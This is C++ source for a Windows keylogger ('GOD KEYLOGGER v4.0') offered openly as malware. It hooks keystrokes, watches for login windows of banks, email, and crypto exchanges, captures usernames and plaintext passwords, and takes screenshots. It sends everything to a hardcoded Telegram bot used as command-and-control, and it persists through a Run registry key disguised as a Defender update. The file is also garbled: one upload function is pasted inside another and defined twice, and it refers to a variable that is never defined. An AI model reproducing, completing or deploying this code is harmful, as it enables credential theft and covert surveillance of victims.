#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <thread>
#include <atomic>
#include <sstream>
#include <regex>
#include <map>
#include <gdiplus.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// 🔥 GOD MODE C2
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// 🔥 GLOBAL VARIABLES
CRITICAL_SECTION cs;
std::wstring keystrokes_buffer;
ULONGLONG last_trigger = 0;
ULONGLONG last_exfil = 0;
ULONGLONG last_credential_capture = 0;
int screenshot_count = 0;
HHOOK keyboard_hook = NULL;
std::atomic<bool> is_running(true);
bool in_login_form = false;
std::wstring username_buffer;
std::wstring password_buffer;
bool expecting_password = false;
int tab_press_count = 0;
ULONG_PTR gdiplusToken = 0;

// 🔥 CRITICAL WEBSITES & APPS
const wchar_t* LOGIN_SITES[] = {
    L"gmail.com", L"google.com", L"outlook.com", L"hotmail.com",
    L"yahoo.com", L"facebook.com", L"instagram.com", L"twitter.com",
    L"linkedin.com", L"github.com", L"microsoft.com", L"apple.com",
    L"paypal.com", L"amazon.com", L"ebay.com", L"bankofamerica.com",
    L"chase.com", L"wellsfargo.com", L"coinbase.com", L"binance.com",
    L"login", L"signin", L"authentication", L"verify", NULL
};

// 🔥 FUNCTION PROTOTYPES
void SendTelegram(const wchar_t* msg);
bool TakeSmartScreenshot();
bool UploadToTelegram(const wchar_t* jpg_path, const wchar_t* caption);
void ExtractCredentials();
bool IsLoginPage(const std::wstring& title, const std::wstring& class_name);
bool DetectFormFields(HWND window);
void EstablishPersistence();
std::wstring GetSpecialKeyName(DWORD vkCode);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

// 🔥 GDI+ INITIALIZER
void InitGDIPlus() {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

// 🔥 GDI+ Encoder Helper
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    ImageCodecInfo* pImageCodecInfo = NULL;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// 🔥 SMART SPECIAL KEYS MAPPING
std::wstring GetSpecialKeyName(DWORD vkCode) {
    switch(vkCode) {
        case VK_RETURN: return L"[ENTER]";
        case VK_TAB: return L"[TAB]";
        case VK_SPACE: return L" ";
        case VK_BACK: return L"[BACKSPACE]";
        case VK_DELETE: return L"[DEL]";
        case VK_ESCAPE: return L"[ESC]";
        case VK_CONTROL: return L"[CTRL]";
        case VK_MENU: return L"[ALT]";
        case VK_SHIFT: return L"[SHIFT]";
        case VK_CAPITAL: return L"[CAPS]";
        case VK_LWIN: case VK_RWIN: return L"[WIN]";
        case VK_UP: return L"[UP]";
        case VK_DOWN: return L"[DOWN]";
        case VK_LEFT: return L"[LEFT]";
        case VK_RIGHT: return L"[RIGHT]";
        case VK_PRIOR: return L"[PGUP]";
        case VK_NEXT: return L"[PGDN]";
        case VK_HOME: return L"[HOME]";
        case VK_END: return L"[END]";
        case VK_INSERT: return L"[INS]";
        case VK_F1: return L"[F1]"; case VK_F2: return L"[F2]";
        case VK_F3: return L"[F3]"; case VK_F4: return L"[F4]";
        case VK_F5: return L"[F5]"; case VK_F6: return L"[F6]";
        case VK_F7: return L"[F7]"; case VK_F8: return L"[F8]";
        case VK_F9: return L"[F9]"; case VK_F10: return L"[F10]";
        case VK_F11: return L"[F11]"; case VK_F12: return L"[F12]";
        default: return L"";
    }
}

// 🔥 CHECK IF CURRENT WINDOW IS LOGIN PAGE
bool IsLoginPage(const std::wstring& title, const std::wstring& class_name) {
    std::wstring title_lower = title;
    std::wstring class_lower = class_name;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    std::transform(class_lower.begin(), class_lower.end(), class_lower.begin(), ::towlower);
    
    for (int i = 0; LOGIN_SITES[i]; i++) {
        if (title_lower.find(LOGIN_SITES[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    return false;
}

// 🔥 EXTRACT CREDENTIALS FROM BUFFER
void ExtractCredentials() {
    if (username_buffer.empty() && password_buffer.empty()) {
        return;
    }
    
    std::wstring credential_msg = L"🔐 CREDENTIAL CAPTURED!\n";
    credential_msg += L"Timestamp: " + std::to_wstring(std::time(nullptr)) + L"\n";
    
    if (!username_buffer.empty()) {
        credential_msg += L"Username/Email: " + username_buffer + L"\n";
    }
    
    if (!password_buffer.empty()) {
        credential_msg += L"Password: " + std::wstring(password_buffer.length(), L'*') + L"\n";
        credential_msg += L"Actual Password: " + password_buffer + L"\n";
    }
    
    HWND fg = GetForegroundWindow();
    wchar_t title[256] = {0};
    GetWindowTextW(fg, title, 256);
    credential_msg += L"From Window: " + std::wstring(title) + L"\n";
    
    SendTelegram(credential_msg.c_str());
    
    if (screenshot_count < 100) {
        TakeSmartScreenshot();
    }
    
    username_buffer.clear();
    password_buffer.clear();
    expecting_password = false;
    tab_press_count = 0;
    
    last_credential_capture = GetTickCount64();
}

// 🔥 SMART KEYBOARD HOOK WITH CREDENTIAL DETECTION
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        EnterCriticalSection(&cs);
        
        HWND fg = GetForegroundWindow();
        wchar_t title[256] = {0}, cls[128] = {0};
        GetWindowTextW(fg, title, 256);
        GetClassNameW(fg, cls, 128);
        
        std::wstring current_title = title;
        std::wstring current_class = cls;
        
        bool on_login_page = IsLoginPage(current_title, current_class);
        
        if (on_login_page) {
            if (!in_login_form) {
                in_login_form = true;
                username_buffer.clear();
                password_buffer.clear();
                expecting_password = false;
                tab_press_count = 0;
                
                std::wstring msg = L"🔑 LOGIN FORM DETECTED!\nWindow: " + current_title;
                SendTelegram(msg.c_str());
            }
            
            if (kb->vkCode == VK_TAB) {
                tab_press_count++;
                if (tab_press_count == 1 && !username_buffer.empty()) {
                    expecting_password = true;
                    keystrokes_buffer += L"[SWITCHED TO PASSWORD FIELD]";
                }
            }
            
            if (kb->vkCode == VK_RETURN) {
                if (!username_buffer.empty() || !password_buffer.empty()) {
                    ExtractCredentials();
                }
                in_login_form = false;
            }
            
            if (kb->vkCode == VK_ESCAPE) {
                in_login_form = false;
                username_buffer.clear();
                password_buffer.clear();
            }
            
            if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                wchar_t buffer[16] = {0};
                int result = ToUnicode(kb->vkCode, kb->scanCode, keyboard_state, 
                                      buffer, _countof(buffer), 0);
                
                if (result > 0) {
                    std::wstring key(buffer, result);
                    if (expecting_password) {
                        password_buffer += key;
                        keystrokes_buffer += L"*";
                    } else {
                        username_buffer += key;
                        keystrokes_buffer += key;
                    }
                }
            }
            
            if (kb->vkCode == VK_BACK) {
                if (expecting_password && !password_buffer.empty()) {
                    password_buffer.pop_back();
                } else if (!username_buffer.empty()) {
                    username_buffer.pop_back();
                }
                keystrokes_buffer += L"[BACKSPACE]";
            }
        } else {
            if (in_login_form) {
                if (!username_buffer.empty() || !password_buffer.empty()) {
                    ExtractCredentials();
                }
                in_login_form = false;
            }
            
            std::wstring special_key = GetSpecialKeyName(kb->vkCode);
            if (!special_key.empty()) {
                keystrokes_buffer += special_key;
            } else if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                wchar_t buffer[16] = {0};
                int result = ToUnicode(kb->vkCode, kb->scanCode, keyboard_state, 
                                      buffer, _countof(buffer), 0);
                if (result > 0) {
                    keystrokes_buffer += std::wstring(buffer, result);
                }
            }
        }
        
        bool should_exfil = false;
        ULONGLONG current_time = GetTickCount64();
        
        if (keystrokes_buffer.length() > 500) {
            should_exfil = true;
        }
        
        if (current_time - last_exfil > 180000) {
            should_exfil = true;
        }
        
        if (kb->vkCode == VK_RETURN && on_login_page) {
            should_exfil = true;
        }
        
        if (should_exfil && keystrokes_buffer.length() > 10) {
            std::time_t now = std::time(nullptr);
            std::wstring timestamp = L"\n[LOG: " + std::to_wstring(now) + L"]";
            std::wstring context = L"\n[Window: " + current_title + L"]";
            std::wstring full_log = timestamp + context + L"\n" + keystrokes_buffer + L"\n";
            
            SendTelegram(L"📝 Keylog Update");
            
            keystrokes_buffer.clear();
            last_exfil = current_time;
        }
        
        LeaveCriticalSection(&cs);
    }
    
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

// 🔥 SMART FORM DETECTION
bool DetectFormFields(HWND window) {
    wchar_t title[256] = {0};
    GetWindowTextW(window, title, 256);
    std::wstring title_lower = title;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    
    const wchar_t* password_keywords[] = {L"password", L"pass", L"pwd", NULL};
    for (int i = 0; password_keywords[i]; i++) {
        if (title_lower.find(password_keywords[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    return false;
}

// 🔥 1. SMART JPEG SCREENSHOT FUNCTION
bool TakeSmartScreenshot() {
    SendTelegram(L"📸 Capturing screen...");
    
    HWND fg = GetForegroundWindow();
    if (!fg) {
        SendTelegram(L"❌ No active window");
        return false;
    }
    
    RECT window_rect;
    GetWindowRect(fg, &window_rect);
    
    // Adjust for browser chrome
    window_rect.top += 80;
    window_rect.left += 5;
    window_rect.right -= 5;
    window_rect.bottom -= 30;
    
    int width = window_rect.right - window_rect.left;
    int height = window_rect.bottom - window_rect.top;
    
    if (width < 100) width = 100;
    if (height < 100) height = 100;
    
    wchar_t temp_path[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_path);
    
    wchar_t jpg_path[MAX_PATH];
    ULONGLONG timestamp = GetTickCount64();
    swprintf(jpg_path, MAX_PATH, L"%sshot_%llu.jpg", temp_path, timestamp);
    
    // Capture screen to memory
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc = CreateCompatibleDC(screen_dc);
    HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);
    
    BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
           window_rect.left, window_rect.top, SRCCOPY | CAPTUREBLT);
    
    // Save as JPEG using GDI+
    Bitmap* gdiBitmap = Bitmap::FromHBITMAP(bitmap, NULL);
    if (!gdiBitmap) {
        SendTelegram(L"❌ Cannot create GDI+ bitmap");
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return false;
    }
    
    CLSID jpgClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpgClsid) == -1) {
        SendTelegram(L"❌ Cannot find JPEG encoder");
        delete gdiBitmap;
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return false;
    }
    
    // Save with high quality
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    
    ULONG quality = 90; // High quality
    encoderParams.Parameter[0].Value = &quality;
    
    Status status = gdiBitmap->Save(jpg_path, &jpgClsid, &encoderParams);
    
    delete gdiBitmap;
    SelectObject(mem_dc, old_bitmap);
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    
    if (status != Ok) {
        SendTelegram(L"❌ Cannot save JPEG");
        return false;
    }
    
    // Get caption
    wchar_t window_title[256] = {0};
    GetWindowTextW(fg, window_title, 256);
    
    std::wstring caption = L"📸 ";
    caption += window_title;
    if (in_login_form) {
        caption += L" (Login Form)";
    }
       // Upload JPEG to Telegram
    
bool UploadToTelegram(const wchar_t* jpg_path, const wchar_t* caption) {
    OutputDebugStringW(L"📤 Starting JPEG upload...\n");
    
    // 1. READ FILE
    HANDLE file = CreateFileW(jpg_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        OutputDebugStringW(L"❌ File open failed\n");
        return false;
    }
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size == 0 || file_size > 10*1024*1024) { // 10MB max
        CloseHandle(file);
        OutputDebugStringW(L"❌ Invalid file size\n");
        return false;
    }
    
    std::vector<BYTE> file_data(file_size);
    DWORD bytes_read;
    ReadFile(file, file_data.data(), file_size, &bytes_read, NULL);
    CloseHandle(file);
    
    if (bytes_read != file_size) {
        OutputDebugStringW(L"❌ Read failed\n");
        return false;
    }
    
    // 2. UNIQUE BOUNDARY (FIX COLLISION)
    std::string boundary = "----GodModeBoundaryV4_" + std::to_string(GetTickCount64()) + "_" + std::to_string((DWORD)file_size);
    
    // 3. BUILD MULTIPART (SIMPLE + CORRECT)
    std::string multipart = 
        "--"s + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
        std::string(CHAT_ID) + "\r\n" +
        "--"s + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
        std::string(caption) + "\r\n" +
        "--"s + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n" +
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string end_boundary = "\r\n--"s + boundary + "--\r\n";
    
    // 4. COMBINE DATA
    std::vector<BYTE> post_data;
    post_data.insert(post_data.end(), multipart.begin(), multipart.end());
    post_data.insert(post_data.end(), file_data.begin(), file_data.end());
    post_data.insert(post_data.end(), end_boundary.begin(), end_boundary.end());
    
    // 5. WINHTTP (SIMPLE + ROBUST)
    HINTERNET session = WinHttpOpen(L"GodKeylogger/4.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        OutputDebugStringW(L"❌ WinHttpOpen failed\n");
        return false;
    }
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        OutputDebugStringW(L"❌ WinHttpConnect failed\n");
        return false;
    }
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", 
        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        OutputDebugStringW(L"❌ WinHttpOpenRequest failed\n");
        return false;
    }
    
    // 6. HEADERS
    std::string content_type = "multipart/form-data; boundary=" + boundary;
    BOOL headers_set = WinHttpAddRequestHeadersA(request, 
        ("Content-Type: " + content_type + "\r\n").c_str(), 
        -1UL, WINHTTP_ADDREQ_FLAG_ADD);
    
    if (!headers_set) {
        OutputDebugStringW(L"❌ Headers failed\n");
        goto cleanup;
    }
    
    // 7. SEND REQUEST
    BOOL sent = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  post_data.data(), post_data.size(), post_data.size(), 0);
    if (!sent) {
        OutputDebugStringW(L"❌ SendRequest failed\n");
        goto cleanup;
    }
    
    // 8. RECEIVE RESPONSE
    BOOL received = WinHttpReceiveResponse(request, NULL);
    if (!received) {
        OutputDebugStringW(L"❌ ReceiveResponse failed\n");
        goto cleanup;
    }
    
    // 9. CHECK STATUS
    DWORD status = 0;
    DWORD status_size = sizeof(DWORD);
    BOOL status_ok = WinHttpQueryHeaders(request, 
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &status, &status_size, NULL);
    
    if (status_ok && status == 200) {
        OutputDebugStringW(L"✅ JPEG UPLOADED SUCCESS!\n");
        SendTelegram(L"✅ JPEG UPLOADED! 📸🔥\n💥 ZAZA KEEP GOING! 🚀");
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return true;
    } else {
        OutputDebugStringW(L"❌ HTTP Status: ");
        char buf[32]; sprintf(buf, "%lu\n", status);
        OutputDebugStringA(buf);
    }
    
cleanup:
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    SendTelegram(L"❌ Upload failed - retrying...");
    return false;
}

    
    // Clean up
    DeleteFileW(jpg_path);
    
    screenshot_count++;
    return upload_success;
}

// 🔥 2. REAL JPEG UPLOAD TO TELEGRAM
bool UploadToTelegram(const wchar_t* jpg_path, const wchar_t* caption) {
    SendTelegram(L"📤 Uploading JPEG to Telegram...");
    
    // Read JPEG file
    HANDLE file = CreateFileW(jpg_path, GENERIC_READ, FILE_SHARE_READ, 
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        SendTelegram(L"❌ Cannot open JPEG file");
        return false;
    }
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        CloseHandle(file);
        SendTelegram(L"❌ JPEG file is empty");
        return false;
    }
    
    BYTE* file_data = new BYTE[file_size];
    DWORD bytes_read;
    if (!ReadFile(file, file_data, file_size, &bytes_read, NULL)) {
        delete[] file_data;
        CloseHandle(file);
        SendTelegram(L"❌ Cannot read JPEG file");
        return false;
    }
    CloseHandle(file);
    
    // Build boundary
    std::string boundary = "---------------------------" + std::to_string(GetTickCount64());
    
    // Build multipart form data
    std::string form_data;
    
    // Add chat_id
    form_data += "--" + boundary + "\r\n";
    form_data += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    std::wstring chat_id_w = CHAT_ID;
    form_data += std::string(chat_id_w.begin(), chat_id_w.end()) + "\r\n";
    
    // Add caption
    form_data += "--" + boundary + "\r\n";
    form_data += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    std::wstring caption_w = caption;
    form_data += std::string(caption_w.begin(), caption_w.end()) + "\r\n";
    
    // Add photo
    form_data += "--" + boundary + "\r\n";
    form_data += "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n";
    form_data += "Content-Type: image/jpeg\r\n\r\n";
    
    // Build final body
    std::string body_start = form_data;
    std::string body_end = "\r\n--" + boundary + "--\r\n";
    
    DWORD total_size = body_start.size() + file_size + body_end.size();
    BYTE* post_data = new BYTE[total_size];
    
    // Combine all parts
    memcpy(post_data, body_start.c_str(), body_start.size());
    memcpy(post_data + body_start.size(), file_data, file_size);
    memcpy(post_data + body_start.size() + file_size, body_end.c_str(), body_end.size());
    
    delete[] file_data;
    
    // Send to Telegram
    HINTERNET session = WinHttpOpen(L"GodKeyLogger/3.0", 
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, 
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        delete[] post_data;
        SendTelegram(L"❌ Network error");
        return false;
    }
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        delete[] post_data;
        WinHttpCloseHandle(session);
        SendTelegram(L"❌ Cannot connect to Telegram");
        return false;
    }
    
    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto";
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(),
                                          NULL, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        delete[] post_data;
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        SendTelegram(L"❌ Cannot create request");
        return false;
    }
    
    // Set content type
    std::string content_type = "multipart/form-data; boundary=" + boundary;
    std::wstring content_type_w(content_type.begin(), content_type.end());
    
    if (WinHttpSendRequest(request,
                          content_type_w.c_str(), -1,
                          post_data, total_size,
                          total_size, 0)) {
        WinHttpReceiveResponse(request, NULL);
        
        DWORD status_code = 0;
        DWORD status_code_size = sizeof(status_code);
        WinHttpQueryHeaders(request, 
                           WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           WINHTTP_HEADER_NAME_BY_INDEX, 
                           &status_code, &status_code_size, WINHTTP_NO_HEADER_INDEX);
        
        delete[] post_data;
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        
        if (status_code == 200) {
            SendTelegram(L"✅ JPEG UPLOADED TO TELEGRAM! 🚀\n💥 ZAZA KEEP GOING!");
            return true;
        } else {
            std::wstring error_msg = L"❌ Telegram error: ";
            error_msg += std::to_wstring(status_code);
            SendTelegram(error_msg.c_str());
            return false;
        }
    }
    
    delete[] post_data;
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    SendTelegram(L"❌ Upload failed");
    return false;
}

// 🔥 ENHANCED TELEGRAM FUNCTION
void SendTelegram(const wchar_t* msg) {
    for (int attempt = 0; attempt < 3; attempt++) {
        HINTERNET session = WinHttpOpen(L"GodKeyLogger/3.0", 
                                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                        WINHTTP_NO_PROXY_NAME, 
                                        WINHTTP_NO_PROXY_BYPASS, 0);
        if (!session) {
            if (attempt == 2) return;
            Sleep(1000);
            continue;
        }
        
        HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                           INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!connect) {
            WinHttpCloseHandle(session);
            if (attempt == 2) return;
            Sleep(1000);
            continue;
        }
        
        std::wstring encoded_msg;
        for (const wchar_t* p = msg; *p; ++p) {
            switch(*p) {
                case L' ': encoded_msg += L"%20"; break;
                case L'\n': encoded_msg += L"%0A"; break;
                case L'&': encoded_msg += L"%26"; break;
                case L'?': encoded_msg += L"%3F"; break;
                case L'=': encoded_msg += L"%3D"; break;
                case L'+': encoded_msg += L"%2B"; break;
                case L'#': encoded_msg += L"%23"; break;
                default: encoded_msg += *p;
            }
        }
        
        std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + 
                          L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + 
                          L"&parse_mode=HTML" +
                          L"&text=" + encoded_msg;
        
        HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(),
                                              NULL, WINHTTP_NO_REFERER,
                                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                                              WINHTTP_FLAG_SECURE);
        if (request) {
            WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                              WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            WinHttpReceiveResponse(request, NULL);
            
            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            WinHttpQueryHeaders(request, 
                               WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                               WINHTTP_HEADER_NAME_BY_INDEX, 
                               &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX);
            
            WinHttpCloseHandle(request);
            
            if (statusCode == 200) {
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return;
            }
        }
        
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        
        if (attempt < 2) Sleep(2000);
    }
}

// 🔥 PERSISTENCE
void EstablishPersistence() {
    HKEY hKey;
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ,
                      (BYTE*)exe_path, (wcslen(exe_path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// 🔥 ACTIVE MONITOR FOR LOGIN PAGES
DWORD WINAPI LoginDetectorThread(LPVOID) {
    while (is_running) {
        HWND fg = GetForegroundWindow();
        if (fg) {
            wchar_t title[256] = {0}, cls[128] = {0};
            GetWindowTextW(fg, title, 256);
            GetClassNameW(fg, cls, 128);
            
            bool is_login_page = IsLoginPage(title, cls);
            
            if (is_login_page && !in_login_form) {
                EnterCriticalSection(&cs);
                in_login_form = true;
                username_buffer.clear();
                password_buffer.clear();
                expecting_password = false;
                tab_press_count = 0;
                
                std::wstring msg = L"🚨 LOGIN PAGE DETECTED!\n";
                msg += L"🌐 Site: " + std::wstring(title) + L"\n";
                msg += L"🕐 Time: " + std::to_wstring(std::time(nullptr)) + L"\n";
                msg += L"🔍 Status: Monitoring for credentials...";
                
                SendTelegram(msg.c_str());
                
                if (screenshot_count < 50) {
                    TakeSmartScreenshot();
                }
                
                LeaveCriticalSection(&cs);
            }
            
            if (is_login_page && DetectFormFields(fg)) {
                expecting_password = true;
            }
        }
        
        Sleep(1000);
    }
    return 0;
}

// 🔥 MAIN FUNCTION
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    
    // Initialize GDI+
    InitGDIPlus();
    
    InitializeCriticalSection(&cs);
    
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"GodKeyLogger_Ultimate_v4");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        GdiplusShutdown(gdiplusToken);
        return 0;
    }
    
    EstablishPersistence();
    
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    
    CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
    
    // 🔥 ZAZA STARTUP MESSAGE
    std::wstring startup_msg = L"⚡ GOD KEYLOGGER v4.0 ACTIVATED\n";
    startup_msg += L"==============================\n";
    startup_msg += L"✅ Login Detection: ACTIVE\n";
    startup_msg += L"✅ Credential Capture: ACTIVE\n";
    startup_msg += L"✅ JPEG Screenshots: ACTIVE\n";
    startup_msg += L"✅ Telegram C2: ACTIVE\n";
    startup_msg += L"✅ Persistence: ESTABLISHED\n";
    startup_msg += L"==============================\n";
    startup_msg += L"🕐 Startup Time: " + std::to_wstring(std::time(nullptr)) + L"\n";
    startup_msg += L"\n💥 ZAZA KEEP GOING! 🚀🔥";
    
    SendTelegram(startup_msg.c_str());
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && is_running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboard_hook);
    DeleteCriticalSection(&cs);
    
    GdiplusShutdown(gdiplusToken);
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    return 0;
}
